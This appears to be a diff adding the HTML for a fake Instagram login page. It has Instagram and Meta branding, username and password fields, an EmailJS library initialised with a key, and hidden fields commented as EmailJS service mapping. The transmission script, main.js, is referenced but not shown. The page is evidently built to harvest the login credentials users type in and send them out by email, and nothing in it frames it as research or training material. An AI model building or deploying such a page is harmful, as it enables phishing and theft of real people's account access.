@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="./style.css">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    emailjs.init("lsupzt-ka0XQGb0jB");
+  </script>
+</head>
+<body>
+  <div class="page">
+    <!-- Language selector -->
+    <header class="lang-header">
+      <button type="button" class="lang-selector" aria-label="Select language">
+        <span>English (US)</span>
+        <svg class="lang-arrow" width="12" height="12" viewBox="0 0 12 12" fill="none" aria-hidden="true">
+          <path d="M2.5 4.5L6 8L9.5 4.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </header>
+
+    <!-- Main login area -->
+    <main class="login-main">
+      <!-- Instagram logo -->
+      <div class="logo-wrap">
+        <img src="./meta-cdn.png" alt="Instagram" class="instagram-logo">
+      </div>
+
+      <!-- Login form -->
+      <form id="login-form" class="login-form" novalidate>
+        <div class="input-group">
+          <input
+            type="text"
+            id="username"
+            name="username"
+            class="form-input"
+            placeholder="Username, email or mobile number"
+            autocomplete="username"
+            required
+          >
+        </div>
+        <div class="input-group">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            class="form-input"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          >
+        </div>
+        <button type="submit" id="login-btn" class="btn-login" disabled>Log in</button>
+
+        <!-- Hidden fields for EmailJS service mapping -->
+        <input type="hidden" id="name">
+        <input type="hidden" id="review">
+      </form>
+
+      <a href="#" class="forgot-link">Forgot password?</a>
+    </main>
+
+    <!-- Bottom section -->
+    <footer class="page-footer">
+      <a href="#" class="btn-create">Create new account</a>
+
+      <div class="meta-brand">
+        <img src="./meta-logo-temp.png" alt="Meta" class="meta-logo-img">
+      </div>
+    </footer>
+  </div>
+
+  <script src="./main.js"></script>
+</body>
+</html>
